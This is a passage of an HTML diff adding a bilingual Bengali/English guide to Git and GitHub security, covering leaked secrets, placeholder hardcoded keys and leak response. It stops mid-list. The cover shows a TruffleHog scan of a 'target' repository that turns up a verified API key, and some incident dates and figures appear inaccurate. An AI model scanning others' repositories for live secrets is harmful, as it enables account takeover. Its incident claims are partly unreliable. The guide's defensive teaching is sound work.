@@ -1,0 +1,1498 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Git & GitHub Security — সম্পূর্ণ বাংলা গাইড</title>
+<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&family=Noto+Sans+Bengali:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --primary: #0d1b2a;
+    --accent: #238636;
+    --accent2: #2dc653;
+    --red: #e63946;
+    --blue: #0077b6;
+    --yellow: #ffd60a;
+    --orange: #f4831f;
+    --purple: #7b2d8b;
+    --code-bg: #0d1117;
+    --code-border: #30363d;
+    --text: #1a1a2e;
+    --bg: #f0fff4;
+    --card: #ffffff;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'Hind Siliguri','Noto Sans Bengali',sans-serif; background:var(--bg); color:var(--text); font-size:14px; line-height:1.9; transition:background 0.3s,color 0.3s; }
+
+  /* BILINGUAL */
+  .en-text { display:none; } .bn-text { display:inline; }
+  body.lang-en .bn-text { display:none; } body.lang-en .en-text { display:inline; }
+  .en-block { display:none; } .bn-block { display:block; }
+  body.lang-en .bn-block { display:none; } body.lang-en .en-block { display:block; }
+
+  /* DARK MODE */
+  body.dark-mode { --bg:#010a04; --card:#0d1a0d; --text:#cde8d0; }
+  body.dark-mode .toc { background:#0d1a0d; }
+  body.dark-mode .chapter { background:#0d1a0d; }
+  body.dark-mode .chapter-body { background:#0d1a0d; }
+  body.dark-mode h2.sec { color:#56d364; }
+  body.dark-mode h3.sub { color:#3fb950; border-color:#1a3a1a; }
+  body.dark-mode .toc-main { color:#cde8d0; border-color:#1a3a1a; }
+  body.dark-mode .toc-header { color:#cde8d0; }
+  body.dark-mode .toc-sub { color:#6a9a6a; }
+  body.dark-mode td { border-color:#1a3a1a; color:#cde8d0; }
+  body.dark-mode tr:nth-child(even) { background:#0a1a0a; }
+  body.dark-mode tr:hover { background:#102010; }
+  body.dark-mode .card { background:#0a1a0a; border-color:#1a3a1a; color:#cde8d0; }
+  body.dark-mode .card h4 { color:#56d364; }
+  body.dark-mode .info { background:#051a15; color:#6ee7b7; }
+  body.dark-mode .warn { background:#1a1000; color:#fbbf24; }
+  body.dark-mode .danger { background:#1a0505; color:#fc8181; }
+  body.dark-mode .success { background:#051a05; color:#6ee7b7; }
+  body.dark-mode .purple-box { background:#0a0515; color:#d8b4fe; }
+  body.dark-mode code { background:#0a1a0a; color:#56d364; }
+  body.dark-mode .diagram { background:#010a04; }
+  body.dark-mode .cheat-card { border-color:#1a3a1a; }
+  body.dark-mode .cheat-row { border-color:#0f2010; }
+  body.dark-mode .cheat-desc { color:#6a9a6a; }
+  body.dark-mode .cheat-cmd { color:#56d364; }
+  body.dark-mode .hl { background:#0a1a0a; border-color:#1a5a1a; }
+  body.dark-mode .secret-card { background:#0a1a0a; border-color:#1a3a1a; }
+  body.dark-mode .secret-card p { color:#6a9a6a; }
+
+  /* CONTROLS */
+  .top-controls { position:fixed; top:20px; right:20px; display:flex; gap:10px; z-index:9999; flex-wrap:wrap; justify-content:flex-end; }
+  .ctrl-btn { border:none; padding:10px 18px; border-radius:8px; font-size:13px; font-family:inherit; cursor:pointer; transition:all 0.3s; font-weight:700; box-shadow:0 4px 12px rgba(0,0,0,0.3); }
+  .lang-btn { background:#238636; color:white; }
+  .lang-btn:hover { background:#1a6b2a; transform:translateY(-2px); }
+  .theme-btn { background:#2dc653; color:#0d1b2a; }
+  .theme-btn:hover { background:#25a344; transform:translateY(-2px); }
+  .print-btn { background:#e63946; color:white; }
+  .print-btn:hover { background:#c1121f; transform:translateY(-2px); }
+
+  /* COVER */
+  .cover {
+    background:linear-gradient(135deg,#010a04 0%,#051a0d 40%,#0a1b2a 100%);
+    color:white; min-height:100vh; display:flex; flex-direction:column;
+    align-items:center; justify-content:center; text-align:center;
+    padding:60px 40px; position:relative; overflow:hidden;
+  }
+  .cover::before {
+    content:''; position:absolute; inset:0;
+    background:repeating-linear-gradient(
+      0deg, transparent, transparent 30px,
+      rgba(35,134,54,0.05) 30px, rgba(35,134,54,0.05) 31px
+    );
+  }
+  .cover-icon { font-size:90px; margin-bottom:20px; animation:float 3s ease-in-out infinite; }
+  @keyframes float { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-12px)} }
+  .cover h1 { font-size:38px; font-weight:700; color:#56d364; text-shadow:0 0 30px rgba(86,211,100,0.5); }
+  .cover h2 { font-size:20px; font-weight:400; opacity:0.8; margin:10px 0 25px; }
+  .cover .divider { width:120px; height:3px; background:var(--accent2); margin:20px auto; border-radius:2px; }
+  .cover .desc { font-size:15px; opacity:0.7; max-width:650px; line-height:2; }
+  .cover .badges { margin-top:30px; }
+  .cover .badge { display:inline-block; background:rgba(35,134,54,0.2); border:1px solid rgba(86,211,100,0.4); padding:6px 18px; border-radius:20px; margin:5px; font-size:13px; color:#7ee787; }
+  .cover .terminal { background:rgba(0,0,0,0.6); border:1px solid rgba(86,211,100,0.3); border-radius:10px; padding:20px 30px; margin-top:30px; font-family:'Courier New',monospace; font-size:13px; color:#56d364; text-align:left; max-width:540px; }
+  .cover .terminal .prompt { color:#89b4fa; }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+
+  /* TOC */
+  .toc { background:white; padding:50px 60px; }
+  .toc-header { font-size:30px; color:var(--primary); border-bottom:4px solid var(--accent); padding-bottom:15px; margin-bottom:35px; }
+  .toc-chapter { margin-bottom:5px; }
+  .toc-main { display:flex; justify-content:space-between; padding:10px 0; font-weight:700; font-size:16px; color:var(--primary); border-bottom:1px solid #e0f0e0; margin-top:15px; }
+  .toc-main .num { color:var(--accent); margin-right:10px; }
+  .toc-sub { padding:5px 0 5px 30px; color:#555; font-size:13.5px; border-bottom:1px dotted #e0f0e0; }
+
+  /* CHAPTERS */
+  .chapter { background:white; margin:0; page-break-before:always; }
+  .chapter-header { padding:40px 55px; position:relative; overflow:hidden; }
+  .ch1 .chapter-header { background:linear-gradient(135deg,#010a04,#051a0d); }
+  .ch2 .chapter-header { background:linear-gradient(135deg,#051a0d,#0a2a15); }
+  .ch3 .chapter-header { background:linear-gradient(135deg,#0a2a15,#1a4731); }
+  .ch4 .chapter-header { background:linear-gradient(135deg,#1a0000,#3d0000); }
+  .ch5 .chapter-header { background:linear-gradient(135deg,#0a1b2a,#0f3460); }
+  .ch6 .chapter-header { background:linear-gradient(135deg,#1a1000,#3d2800); }
+  .ch7 .chapter-header { background:linear-gradient(135deg,#0d0020,#2d1b69); }
+  .ch8 .chapter-header { background:linear-gradient(135deg,#051a0d,#1a4731); }
+  .ch9 .chapter-header { background:linear-gradient(135deg,#010a04,#0a2a15); }
+  .chapter-label { font-size:11px; letter-spacing:4px; color:#56d364; text-transform:uppercase; margin-bottom:10px; }
+  .chapter-title { font-size:28px; color:white; font-weight:700; }
+  .chapter-desc { font-size:14px; color:rgba(255,255,255,0.6); margin-top:8px; }
+  .chapter-body { padding:40px 55px; }
+
+  h2.sec { font-size:22px; color:var(--primary); margin:35px 0 15px; padding-left:18px; border-left:5px solid var(--accent); }
+  h3.sub { font-size:17px; color:#0a2a15; margin:25px 0 12px; padding-bottom:6px; border-bottom:2px dashed #c0e0c0; }
+  p { margin-bottom:14px; text-align:justify; }
+  ul,ol { margin:12px 0 12px 25px; line-height:2; } li { margin-bottom:4px; }
+
+  /* CODE */
+  .code { background:var(--code-bg); color:#c9d1d9; padding:20px 25px; border-radius:10px; font-family:'Courier New',monospace; font-size:13px; margin:18px 0; line-height:1.8; overflow-x:auto; border:1px solid var(--code-border); border-left:4px solid var(--accent); }
+  .code .c { color:#6e7681; } .code .k { color:#ff7b72; } .code .s { color:#a5d6ff; }
+  .code .g { color:#56d364; } .code .y { color:#e3b341; } .code .r { color:#ff7b72; }
+  .code .p { color:#7ee787; } .code .bl { color:#79c0ff; }
+  code { background:#0a1a0a; color:#56d364; padding:2px 8px; border-radius:4px; font-family:'Courier New',monospace; font-size:13px; }
+
+  /* BOXES */
+  .box { padding:18px 22px; border-radius:10px; margin:20px 0; border-left:5px solid; }
+  .info { background:#e8f8ed; border-color:#238636; color:#0f3a1a; }
+  .warn { background:#fff8e6; border-color:#f4831f; color:#7b3f00; }
+  .danger { background:#fde8ea; border-color:#e63946; color:#9b1d20; }
+  .success { background:#e8f8ed; border-color:#2dc653; color:#1a4731; }
+  .purple-box { background:#f3e8ff; border-color:#7b2d8b; color:#4a0072; }
+  .box-t { font-weight:700; margin-bottom:8px; font-size:15px; }
+
+  /* TABLES */
+  table { width:100%; border-collapse:collapse; margin:20px 0; font-size:13.5px; }
+  thead tr { background:var(--primary); color:white; }
+  th { padding:12px 15px; text-align:left; font-weight:600; }
+  td { padding:10px 15px; border-bottom:1px solid #e0f0e0; }
+  tr:nth-child(even) { background:#f0fff4; }
+  tr:hover { background:#d8f5dd; }
+
+  /* DIAGRAM */
+  .diagram { background:#0d1117; border:1px solid #30363d; border-radius:10px; padding:22px; font-family:'Courier New',monospace; font-size:13px; line-height:1.9; margin:20px 0; color:#c9d1d9; overflow-x:auto; }
+  .diagram .dg { color:#56d364; } .diagram .dy { color:#e3b341; }
+  .diagram .db { color:#79c0ff; } .diagram .dr { color:#ff7b72; } .diagram .dp { color:#7ee787; }
+
+  /* GRID */
+  .grid2 { display:grid; grid-template-columns:1fr 1fr; gap:18px; margin:20px 0; }
+  .grid3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:15px; margin:20px 0; }
+  .card { background:#f0fff4; border:1px solid #c0e0c0; border-radius:10px; padding:18px; }
+  .card h4 { color:var(--primary); margin-bottom:10px; font-size:15px; border-bottom:2px solid var(--accent); padding-bottom:6px; }
+  .card.danger-card { border-color:var(--red); } .card.danger-card h4 { color:var(--red); border-color:var(--red); }
+  .card.success-card { border-color:var(--accent2); } .card.success-card h4 { color:#1a4731; border-color:var(--accent2); }
+  .card.blue-card { border-color:var(--blue); } .card.blue-card h4 { color:var(--blue); border-color:var(--blue); }
+  .card.orange-card { border-color:var(--orange); } .card.orange-card h4 { color:var(--orange); border-color:var(--orange); }
+  .card.purple-card { border-color:var(--purple); } .card.purple-card h4 { color:var(--purple); border-color:var(--purple); }
+
+  /* SECRET LEAK CARDS */
+  .secret-grid { display:grid; grid-template-columns:1fr 1fr 1fr; gap:14px; margin:20px 0; }
+  .secret-card { background:white; border:1px solid #c0e0c0; border-radius:12px; overflow:hidden; transition:transform 0.2s; }
+  .secret-card:hover { transform:translateY(-3px); }
+  .secret-card-header { padding:12px 16px; }
+  .secret-card-icon { font-size:26px; margin-bottom:4px; }
+  .secret-card-title { font-weight:700; font-size:14px; color:white; }
+  .secret-card-body { padding:12px 16px; }
+  .secret-card p { font-size:12.5px; color:#444; margin-bottom:8px; text-align:left; }
+  .sec-tag { display:inline-block; padding:2px 8px; border-radius:10px; font-size:11px; font-weight:600; margin:2px; }
+
+  /* BADGE */
+  .badge { display:inline-block; padding:3px 10px; border-radius:12px; font-size:12px; font-weight:600; margin:2px; }
+  .badge-g { background:#d1e7dd; color:#0f5132; } .badge-r { background:#fde8ea; color:#c1121f; }
+  .badge-y { background:#fff3cd; color:#856404; } .badge-b { background:#cfe2ff; color:#084298; }
+  .badge-p { background:#f3e8ff; color:#4a0072; } .badge-o { background:#ffe8d0; color:#7b3f00; }
+
+  /* SEVERITY */
+  .sev-critical { background:#7f0000; color:white; padding:3px 10px; border-radius:12px; font-size:12px; font-weight:700; }
+  .sev-high { background:#c1121f; color:white; padding:3px 10px; border-radius:12px; font-size:12px; font-weight:700; }
+  .sev-medium { background:#f4831f; color:white; padding:3px 10px; border-radius:12px; font-size:12px; font-weight:700; }
+  .sev-low { background:#ffd60a; color:#333; padding:3px 10px; border-radius:12px; font-size:12px; font-weight:700; }
+
+  /* CHEAT SHEET */
+  .cheat-grid { display:grid; grid-template-columns:1fr 1fr; gap:16px; margin:20px 0; }
+  .cheat-card { background:var(--card); border:1px solid #c0e0c0; border-radius:10px; overflow:hidden; }
+  .cheat-card-header { padding:10px 16px; font-weight:700; font-size:14px; color:white; }
+  .cheat-row { display:flex; padding:6px 14px; border-bottom:1px solid #e8f8ed; font-size:12.5px; gap:12px; align-items:flex-start; }
+  .cheat-row:last-child { border-bottom:none; }
+  .cheat-cmd { font-family:'Courier New',monospace; color:#238636; font-weight:600; min-width:200px; font-size:12px; }
+  .cheat-desc { color:#555; font-size:12.5px; }
+
+  /* ROADMAP */
+  .roadmap-phase { display:flex; gap:20px; margin-bottom:28px; align-items:flex-start; }
+  .phase-number { min-width:50px; height:50px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:20px; font-weight:800; color:white; flex-shrink:0; box-shadow:0 4px 15px rgba(0,0,0,0.3); }
+  .phase-content { flex:1; }
+  .phase-title { font-size:17px; font-weight:700; margin-bottom:6px; }
+  .phase-desc { font-size:13px; color:#555; margin-bottom:8px; }
+  body.dark-mode .phase-desc { color:#6a9a6a; }
+  .phase-items { display:flex; flex-wrap:wrap; gap:7px; }
+  .phase-item { padding:4px 13px; border-radius:20px; font-size:12px; font-weight:600; border:1.5px solid currentColor; }
+  .roadmap-arrow { text-align:center; font-size:26px; color:var(--accent); margin:-12px 0 8px 25px; }
+
+  .hl { background:linear-gradient(135deg,#e8f8ed,#d0f0d8); border:1px solid #238636; padding:15px 20px; border-radius:8px; margin:18px 0; }
+  .chapter-summary { background:linear-gradient(135deg,#010a04,#0a2a15); color:white; border-radius:12px; padding:25px 30px; margin-top:40px; }
+  .chapter-summary h3 { color:#56d364; margin-bottom:15px; font-size:18px; }
+  .chapter-summary li { color:rgba(255,255,255,0.85); margin-bottom:6px; }
+
+  @media (max-width:768px) { .cheat-grid,.grid2,.grid3,.secret-grid { grid-template-columns:1fr; } .chapter-body,.toc { padding:25px 20px; } }
+  @media print { .top-controls { display:none; } }
+</style>
+</head>
+<body class="light-mode">
+
+<div class="top-controls">
+  <button class="lang-btn ctrl-btn" onclick="toggleLang()" id="langBtn">🇬🇧 English</button>
+  <button class="theme-btn ctrl-btn" onclick="toggleTheme()" id="themeBtn">🌙 Dark Mode</button>
+  <button class="print-btn ctrl-btn" onclick="window.print()">🖨️ PDF</button>
+</div>
+
+<!-- ══ COVER ══ -->
+<div class="cover">
+  <div class="cover-icon">🔐</div>
+  <h1>Git & GitHub Security</h1>
+  <h2><span class="bn-text">Secret Leak, Supply Chain Attack ও Secure Workflow — সম্পূর্ণ বাংলা গাইড</span><span class="en-text">Secret Leaks, Supply Chain Attacks & Secure Workflow — Complete Guide</span></h2>
+  <div class="divider"></div>
+  <p class="desc"><span class="bn-text">Git History থেকে API Key বের করা, Repo Scanning, Secret Management, GitHub Actions Security, Supply Chain Attack — Git ও GitHub Security-র সব কিছু এক জায়গায়।</span><span class="en-text">Extracting API Keys from Git history, Repo Scanning, Secret Management, GitHub Actions Security, Supply Chain Attacks — everything about Git and GitHub Security in one place.</span></p>
+  <div class="terminal">
+    <div><span class="prompt">researcher@kali</span>:~# trufflehog github --repo https://github.com/target/app</div>
+    <div style="color:#e3b341">🐷 TruffleHog. Sniffing out secrets...</div>
+    <div style="color:#ff7b72">Found API_KEY: sk-prod-Abc123XYZ... in commit a3f8b2c</div>
+    <div style="color:#56d364">Detector: OpenAI | Verified: true ✓</div>
+    <div style="animation:blink 1s infinite; color:#56d364;">█</div>
+  </div>
+  <div class="badges">
+    <span class="badge">🔍 Secret Scanning</span>
+    <span class="badge">📜 Git History Attack</span>
+    <span class="badge">🏭 Supply Chain</span>
+    <span class="badge">⚙️ GitHub Actions</span>
+    <span class="badge">🔑 Secret Management</span>
+    <span class="badge">🛡️ Branch Protection</span>
+    <span class="badge">🤖 Dependabot</span>
+    <span class="badge">📋 Cheat Sheet</span>
+  </div>
+</div>
+
+<!-- ══ TOC ══ -->
+<div class="toc">
+  <div class="toc-header">📋 <span class="bn-text">বিষয়সূচি</span><span class="en-text">Table of Contents</span></div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০১</span> Git Security <span class="bn-text">পরিচিতি</span><span class="en-text">Introduction</span></span></div>
+    <div class="toc-sub"><span class="bn-text">Git কীভাবে কাজ করে, Security risks, Real-world incidents</span><span class="en-text">How Git works, Security risks, Real-world incidents</span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০২</span> Secret Leak — <span class="bn-text">সবচেয়ে বড় সমস্যা</span><span class="en-text">The Biggest Problem</span></span></div>
+    <div class="toc-sub"><span class="bn-text">কোন কোন জিনিস leak হয়, কীভাবে ঘটে</span><span class="en-text">What leaks, how it happens</span></div>
+    <div class="toc-sub">API Keys, Passwords, Tokens, Private Keys, .env files</div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৩</span> Git History Scanning — <span class="bn-text">পুরনো commit-এ কী আছে?</span><span class="en-text">What's in Old Commits?</span></span></div>
+    <div class="toc-sub">TruffleHog, Gitleaks, git-secrets, GitGuardian</div>
+    <div class="toc-sub"><span class="bn-text">Manual git log analysis, Deleted file recovery</span><span class="en-text">Manual git log analysis, Deleted file recovery</span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৪</span> GitHub Recon — <span class="bn-text">OSINT থেকে Attack</span><span class="en-text">OSINT to Attack</span></span></div>
+    <div class="toc-sub">GitHub Dorking, Exposed repos, Fork analysis</div>
+    <div class="toc-sub">Organization enumeration, Gist secrets</div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৫</span> Supply Chain Attack</span></div>
+    <div class="toc-sub">Dependency confusion, Typosquatting, Malicious package</div>
+    <div class="toc-sub">SolarWinds, XZ Utils — <span class="bn-text">বিখ্যাত incident</span><span class="en-text">Famous incidents</span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৬</span> GitHub Actions Security</span></div>
+    <div class="toc-sub">CI/CD injection, Secrets in logs, Poisoned pipeline</div>
+    <div class="toc-sub"><span class="bn-text">Secure Actions workflow লেখার নিয়ম</span><span class="en-text">Rules for writing secure Actions workflows</span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৭</span> Secret Management — <span class="bn-text">সঠিক পদ্ধতি</span><span class="en-text">The Right Way</span></span></div>
+    <div class="toc-sub">.gitignore, pre-commit hooks, GitHub Secrets</div>
+    <div class="toc-sub">HashiCorp Vault, AWS Secrets Manager, Doppler</div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৮</span> Repository Hardening</span></div>
+    <div class="toc-sub">Branch protection, Signed commits, 2FA, CODEOWNERS</div>
+    <div class="toc-sub">Dependabot, CodeQL, Security advisories</div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৯</span> Cheat Sheet & Roadmap</span></div>
+    <div class="toc-sub"><span class="bn-text">সব গুরুত্বপূর্ণ কমান্ড ও শেখার পথ</span><span class="en-text">All important commands and the learning path</span></div>
+  </div>
+</div>
+
+<!-- ══ CH 01: INTRO ══ -->
+<div class="chapter ch1">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 01</div>
+    <div class="chapter-title">🔐 Git & GitHub Security <span class="bn-text">পরিচিতি</span><span class="en-text">Introduction</span></div>
+    <div class="chapter-desc"><span class="bn-text">Code-এ security কেন গুরুত্বপূর্ণ — Real-world incidents</span><span class="en-text">Why security matters in code — Real-world incidents</span></div>
+  </div>
+  <div class="chapter-body">
+    <h2 class="sec">Git Security <span class="bn-text">কেন গুরুত্বপূর্ণ?</span><span class="en-text">Why is Git Security Important?</span></h2>
+    <p><span class="bn-text">Git হলো বিশ্বের সবচেয়ে ব্যবহৃত version control system, আর GitHub-এ ১০০+ মিলিয়ন repository আছে। প্রতিদিন হাজার হাজার developer ভুলবশত API key, password, database credential commit করছেন — এবং attacker-রা automated tool দিয়ে সেকেন্ডের মধ্যে এগুলো খুঁজে বের করছে।</span><span class="en-text">Git is the world's most used version control system, and GitHub has 100+ million repositories. Every day, thousands of developers accidentally commit API keys, passwords, and database credentials — and attackers find them within seconds using automated tools.</span></p>
+
+    <h2 class="sec"><span class="bn-text">Real-World Incidents — শিক্ষামূলক উদাহরণ</span><span class="en-text">Real-World Incidents — Educational Examples</span></h2>
+    <div class="grid2">
+      <div class="card danger-card">
+        <h4>💥 <span class="bn-text">বিখ্যাত Git Security Incidents</span><span class="en-text">Famous Git Security Incidents</span></h4>
+        <ul>
+          <li><strong>Uber (2022)</strong> — <span class="bn-text">Private repo-তে hardcoded AWS key → $100M data breach</span><span class="en-text">Hardcoded AWS key in private repo → $100M data breach</span></li>
+          <li><strong>Samsung (2023)</strong> — <span class="bn-text">Galaxy source code + secret keys GitHub-এ expose</span><span class="en-text">Galaxy source code + secret keys exposed on GitHub</span></li>
+          <li><strong>Toyota (2023)</strong> — <span class="bn-text">Git repo-তে access key → 296,000 customer data</span><span class="en-text">Access key in Git repo → 296,000 customer records</span></li>
+          <li><strong>Twitch (2021)</strong> — <span class="bn-text">Source code leak + internal credentials</span><span class="en-text">Source code leak + internal credentials</span></li>
+          <li><strong>SolarWinds (2020)</strong> — <span class="bn-text">Supply chain attack → 18,000 organizations compromised</span><span class="en-text">Supply chain attack → 18,000 organizations compromised</span></li>
+        </ul>
+      </div>
+      <div class="card orange-card">
+        <h4>📊 <span class="bn-text">পরিসংখ্যান</span><span class="en-text">Statistics</span></h4>
+        <ul>
+          <li><span class="bn-text">GitHub-এ প্রতি সেকেন্ডে ~৩ টি secret commit হয়</span><span class="en-text">~3 secrets are committed to GitHub every second</span></li>
+          <li><span class="bn-text">২০২৩ সালে ১২.৮ মিলিয়ন secret detected</span><span class="en-text">12.8 million secrets detected in 2023</span></li>
+          <li><span class="bn-text">৮০% publicly exposed secret ৪ ঘণ্টার মধ্যে exploit হয়</span><span class="en-text">80% of publicly exposed secrets are exploited within 4 hours</span></li>
+          <li><span class="bn-text">Public repo delete করলেও Fork-এ থাকতে পারে</span><span class="en-text">Even after deleting a public repo, it may remain in Forks</span></li>
+          <li><span class="bn-text">Git history-তে "deleted" file এখনো accessible</span><span class="en-text">"Deleted" files in Git history are still accessible</span></li>
+        </ul>
+      </div>
+    </div>
+
+    <h2 class="sec">Git <span class="bn-text">কীভাবে কাজ করে — Security দৃষ্টিকোণে</span><span class="en-text">How Git Works — Security Perspective</span></h2>
+    <div class="diagram">
+<pre>
+<span class="dp">Git Object Model — সব কিছু stored, কিছুই হারায় না!</span>
+
+Working Dir → Staging Area → Local Repo (.git/) → Remote (GitHub)
+     │              │               │                    │
+  ফাইল এখানে    git add করে    commit = permanent!   push করলে
+  সম্পাদনা      staging-এ      SHA hash দিয়ে        publicly visible
+                রাখো           identify হয়
+
+<span class="dr">⚠️  secret commit করলে → git rm করলেও history-তে থাকে!</span>
+<span class="dr">⚠️  force push করলেও → GitHub cache-এ থাকতে পারে!</span>
+<span class="dg">✅  সমাধান: git filter-branch / BFG Repo Cleaner</span>
+<span class="dg">✅  সমাধান: Secret immediately rotate করো!</span>
+</pre>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🔐 <span class="bn-text">মূল কথা</span><span class="en-text">Key Points</span></h3>
+      <ul>
+        <li>✅ <span class="bn-text">Git history-তে commit করা কিছু permanently stored থাকে</span><span class="en-text">Anything committed to Git history is permanently stored</span></li>
+        <li>✅ <span class="bn-text">Secret commit হয়ে গেলে → সাথে সাথে rotate করো, delete যথেষ্ট নয়</span><span class="en-text">If a secret is committed → rotate immediately, deletion isn't enough</span></li>
+        <li>✅ <span class="bn-text">Attacker-রা automated tool দিয়ে সেকেন্ডে secret খোঁজে</span><span class="en-text">Attackers find secrets within seconds using automated tools</span></li>
+        <li>✅ Supply Chain → <span class="bn-text">তোমার dependency-ও attack vector হতে পারে</span><span class="en-text">Your dependencies can also be an attack vector</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ══ CH 02: SECRET LEAK ══ -->
+<div class="chapter ch2">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 02</div>
+    <div class="chapter-title">💀 Secret Leak — <span class="bn-text">সবচেয়ে বড় সমস্যা</span><span class="en-text">The Biggest Problem</span></div>
+    <div class="chapter-desc"><span class="bn-text">কী leak হয়, কীভাবে ঘটে, কী পরিণতি হয়</span><span class="en-text">What leaks, how it happens, what the consequences are</span></div>
+  </div>
+  <div class="chapter-body">
+    <h2 class="sec"><span class="bn-text">কোন কোন জিনিস Leak হয়?</span><span class="en-text">What Kinds of Things Leak?</span></h2>
+    <div class="secret-grid">
+      <div class="secret-card">
+        <div class="secret-card-header" style="background:linear-gradient(135deg,#7f0000,#c1121f);">
+          <div class="secret-card-icon">🔑</div>
+          <div class="secret-card-title">API Keys</div>
+        </div>
+        <div class="secret-card-body">
+          <p><span class="bn-text">AWS, OpenAI, Stripe, Twilio, Google API keys — সবচেয়ে বেশি পাওয়া যায়।</span><span class="en-text">AWS, OpenAI, Stripe, Twilio, Google API keys — most commonly found.</span></p>
+          <span class="sec-tag" style="background:#fde8ea;color:#c1121f;">Financial loss</span>
+          <span class="sec-tag sev-critical">CRITICAL</span>
+        </div>
+      </div>
+      <div class="secret-card">
+        <div class="secret-card-header" style="background:linear-gradient(135deg,#1a0030,#4a0072);">
+          <div class="secret-card-icon">🗄️</div>
+          <div class="secret-card-title">Database Credentials</div>
+        </div>
+        <div class="secret-card-body">
+          <p><span class="bn-text">MySQL, PostgreSQL, MongoDB password, connection strings।</span><span class="en-text">MySQL, PostgreSQL, MongoDB passwords, connection strings.</span></p>
+          <span class="sec-tag" style="background:#f3e8ff;color:#4a0072;">Data breach</span>
+          <span class="sec-tag sev-critical">CRITICAL</span>
+        </div>
+      </div>
+      <div class="secret-card">
+        <div class="secret-card-header" style="background:linear-gradient(135deg,#0d1b2a,#0f3460);">
+          <div class="secret-card-icon">🔒</div>
+          <div class="secret-card-title">Private Keys</div>
+        </div>
+        <div class="secret-card-body">
+          <p><span class="bn-text">SSH private key, RSA key, TLS certificate private key।</span><span class="en-text">SSH private key, RSA key, TLS certificate private key.</span></p>
+          <span class="sec-tag" style="background:#cfe2ff;color:#084298;">Server access</span>
+          <span class="sec-tag sev-critical">CRITICAL</span>
+        </div>
+      </div>
+      <div class="secret-card">
+        <div class="secret-card-header" style="background:linear-gradient(135deg,#1a1000,#3d2800);">
+          <div class="secret-card-icon">🎫</div>
+          <div class="secret-card-title">Auth Tokens</div>
+        </div>
+        <div class="secret-card-body">
+          <p><span class="bn-text">GitHub token, Slack token, OAuth token, JWT secret।</span><span class="en-text">GitHub token, Slack token, OAuth token, JWT secret.</span></p>
+          <span class="sec-tag" style="background:#fff3cd;color:#856404;">Account takeover</span>
+          <span class="sec-tag sev-high">HIGH</span>
+        </div>
+      </div>
+      <div class="secret-card">
+        <div class="secret-card-header" style="background:linear-gradient(135deg,#0d2818,#1a4731);">
+          <div class="secret-card-icon">📄</div>
+          <div class="secret-card-title">.env Files</div>
+        </div>
+        <div class="secret-card-body">
+          <p><span class="bn-text">.env, config.yml, settings.py — সব secret এক জায়গায়।</span><span class="en-text">.env, config.yml, settings.py — all secrets in one place.</span></p>
+          <span class="sec-tag" style="background:#d1e7dd;color:#0f5132;">Mass exposure</span>
+          <span class="sec-tag sev-critical">CRITICAL</span>
+        </div>
+      </div>
+      <div class="secret-card">
+        <div class="secret-card-header" style="background:linear-gradient(135deg,#1a0010,#4a0030);">
+          <div class="secret-card-icon">☁️</div>
+          <div class="secret-card-title">Cloud Credentials</div>
+        </div>
+        <div class="secret-card-body">
+          <p><span class="bn-text">AWS access key, GCP service account, Azure connection string।</span><span class="en-text">AWS access key, GCP service account, Azure connection string.</span></p>
+          <span class="sec-tag" style="background:#fde8ea;color:#c1121f;">Cloud takeover</span>
+          <span class="sec-tag sev-critical">CRITICAL</span>
+        </div>
+      </div>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">কীভাবে Secret Leak হয়?</span><span class="en-text">How Do Secrets Leak?</span></h2>
+    <div class="code">
+<span class="c"># ১. সরাসরি hardcode করা — সবচেয়ে সাধারণ ভুল</span>
+<span class="r">AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
+DB_PASSWORD = "SuperSecret123!"
+api_key = "sk-prod-abc123xyz"</span>
+
+<span class="c"># ২. .env file commit করা</span>
+<span class="r">git add .env   # ❌ কখনো করো না!</span>
+<span class="c"># .gitignore-এ .env না থাকলে সহজেই commit হয়</span>
+
+<span class="c"># ৩. Config file-এ</span>
+<span class="r">database:
+  host: prod-db.company.com
+  password: "MyProductionPassword"</span>
+
+<span class="c"># ৪. Comment-এ</span>
+<span class="r"># Old key: AKIAIOSFODNN7EXAMPLE (do not use)</span>
+<span class="c"># Comment delete করলেও history-তে থাকে!</span>
+
+<span class="c"># ৫. Log output-এ</span>
+<span class="r">print(f"Connecting with key: {api_key}")  # Debug code commit করা</span>
+
+<span class="c"># ৬. Test file-এ</span>
+<span class="r">def test_api():
+    key = "real-production-key-123"  # Copy paste থেকে</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Secret Leak হলে কী করবে?</span><span class="en-text">What to Do If a Secret Leaks?</span></h2>
+    <div class="box danger">
+      <div class="box-t">🚨 <span class="bn-text">Emergency Response — এই ক্রমে করো!</span><span class="en-text">Emergency Response — Do This in Order!</span></div>
+      <ol>
+        <li><strong><span class="bn-text">সাথে সাথে Rotate করো</span><span class="en-text">Rotate Immediately</span></strong> — <span class="bn-text">AWS Console / API provider-এ গিয়ে key revoke করো</span><span class="en-text">Go to AWS Console / API provider and revoke the key</span></li>
